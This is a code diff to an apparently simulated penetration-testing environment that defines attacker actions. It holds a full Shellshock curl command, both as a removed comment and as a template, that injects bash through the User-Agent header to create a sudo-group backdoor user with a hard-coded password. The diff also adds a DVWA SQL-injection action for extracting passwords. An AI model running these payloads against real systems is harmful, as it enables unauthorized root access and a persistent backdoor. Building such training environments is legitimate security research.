@@ -86,7 +86,6 @@ class ShellActions:
         :return: the action
         """
         id = ActionId.SHELLSHOCK_EXPLOIT
-        #curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sudo useradd -rm -d /home/sambate -s /bin/bash -g root -G sudo -p $(openssl passwd -1 \'sambatestpw\') sambate'" http://172.18.7.31:80/cgi-bin/vulnerable
         cmd = ["curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c "
                "'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo "
                "-p $(openssl passwd -1 \'{}\') {}'\" http://{}:80/cgi-bin/vulnerable",
@@ -96,5 +95,21 @@ class ShellActions:
         return Action(id=id, name="ShellShock Explolit", cmd=cmd,
                       type=ActionType.EXPLOIT,
                       descr="Uses the Shellshock exploit and curl to do remote code execution and create a backdoor",
+                      cost=0.0, noise=0.0, index=index,
+                      ip=None, subnet=False, action_outcome=ActionOutcome.SHELL_ACCESS, alt_cmd=None)
+
+    @staticmethod
+    def DVWA_SQL_INJECTION(index: int) -> Action:
+        """
+        Launches the  DVWA SQL Injection exploit
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
+        id = ActionId.DVWA_SQL_INJECTION
+        cmd = ["/sql_injection_exploit.sh"]
+        return Action(id=id, name="DVWA SQL Injection Exploit", cmd=cmd,
+                      type=ActionType.EXPLOIT,
+                      descr="Uses the DVWA SQL Injection exploit to extract secret passwords",
                       cost=0.0, noise=0.0, index=index,
                       ip=None, subnet=False, action_outcome=ActionOutcome.SHELL_ACCESS, alt_cmd=None)
